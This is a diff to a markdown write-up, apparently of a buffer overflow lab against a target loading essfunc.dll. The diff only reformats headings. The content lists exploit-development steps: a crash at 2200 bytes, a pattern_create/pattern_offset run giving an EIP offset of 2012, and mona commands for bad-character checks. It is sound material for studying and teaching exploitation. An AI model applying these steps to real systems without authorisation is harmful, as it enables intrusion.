@@ -90,21 +90,22 @@ local: essfunc.dll remote: essfunc.dll
 200 PORT command successful.
 ```
 # Buffer Overflow
-## Fuzz with Immunity debugger 
+## Fuzzing
 ```
 crashed with 2200 bytes
 ```
-## pattern_create.rb -l 2200
+## EIP Offset
+### pattern_create.rb -l 2200
 ```
 EIP = 31704330
 ```
-## pattern_offset.rb -q 31704330
+### pattern_offset.rb -q 31704330
 ```
 [*] Exact match at offset 2012
 ```
 ## Finding Bad Characters 
-###!mona bytearray -b "\x00"
-###!mona compare -f "C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin" -a 016DEEC0
+### !mona bytearray -b "\x00"
+### !mona compare -f "C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin" -a 016DEEC0
 ```
 Log data, item 4
  Address=016DEEC0
